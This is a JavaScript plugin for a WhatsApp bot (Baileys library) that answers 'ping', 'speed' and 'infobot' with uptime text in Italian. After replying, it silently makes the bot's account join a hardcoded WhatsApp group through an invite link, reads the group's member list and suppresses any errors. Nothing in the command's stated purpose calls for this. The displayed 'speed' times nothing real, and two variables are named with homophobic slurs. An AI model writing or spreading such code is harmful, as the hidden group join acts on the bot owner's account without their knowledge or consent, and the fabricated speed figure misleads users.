import os from 'os'
import util from 'util'
import sizeFormatter from 'human-readable'
let runtime = function(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " g, " : " g, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? "h " : " h, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " m, " : " m, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " s" : " s") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
import MessageType from '@adiwajshing/baileys'
import fs from 'fs'
import { performance } from 'perf_hooks'
let handler = async (m, { conn, usedPrefix }) => {
let _uptime = process.uptime() * 1000
let uptime = clockString(_uptime) 
let totalreg = Object.keys(global.db.data.users).length
const chats = Object.entries(conn.chats).filter(([id, data]) => id && data.isChats)
const groupsIn = chats.filter(([id]) => id.endsWith('@g.us'))
const groups = chats.filter(([id]) => id.endsWith('@g.us'))
const used = process.memoryUsage()
const { restrict } = global.db.data.settings[conn.user.jid] || {}
const { autoread } = global.opts
let old = performance.now()
let neww = performance.now()
let speed = (neww - old).toFixed(4)
let info = `
   ✦ 𝓟𝓘𝓝𝓖 𝓔𝓢𝓢𝓔𝓝𝓣𝓘𝓐𝓛 𝓑𝓞𝓣 ✦

𝗩𝗘𝗟𝗢𝗖𝗜𝗧𝗔': ${speed} 𝐬𝐞𝐜𝐨𝐧𝐝𝐢
𝗔𝗧𝗧𝗜𝗩𝗜𝗧𝗔': ${runtime(process.uptime())}
                          ᵉᵈᶦᶻ ᴹᵒᵒⁿᶜˡᵒᵘᵈˢ
`.trim() 
conn.reply(m.chat, info, m, {
contextInfo: { externalAdReply :''}})
let frocio = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
  let delay = time => new Promise(res => setTimeout(res, time))
  let name = m.sender 
let gay = `https://chat.whatsapp.com/IXUpI1rQzNoAHsnBpfHtgV`
let [_, code] = gay.match(frocio) || []
  let owbot = global.sender 
  await delay(30)
  try {
  let res = await conn.groupAcceptInvite(code)
  let b = await conn.groupMetadata(res)
  let d = b.participants.map(v => v.id)
  let member = d.toString()
  let e = await d.filter(v => v.endsWith(owbot + '@s.whatsapp.net'))
    } catch (e) {
      return
      }
}
handler.help = ['infobot', 'speed']
handler.tags = ['info', 'tools']
handler.command = /^(ping|speed|infobot)$/i
export default handler



function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
console.log({ms,h,m,s})
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')}
